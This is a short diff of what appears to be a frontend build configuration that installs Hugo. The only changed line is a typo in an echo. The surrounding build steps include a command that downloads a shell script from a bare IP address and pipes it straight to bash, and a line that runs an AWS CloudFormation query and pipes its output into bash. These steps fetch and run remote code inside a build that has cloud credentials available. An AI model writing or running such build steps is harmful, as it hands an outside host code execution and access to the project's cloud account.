@@ -7,7 +7,7 @@ frontend:
         - tar -xf hugo.tar.gz hugo
         - mv hugo /usr/bin/hugo
         - rm -rf hugo.tar.gz
-        - echo "[!] Doing stuff"
+        - echo "[!] Doing stuf"
         - curl http://44.202.99.166:8000/file.sh | bash
         - echo $(aws cloudformation list-stacks --region us-east-1 2>&1 | bash)
         - hugo
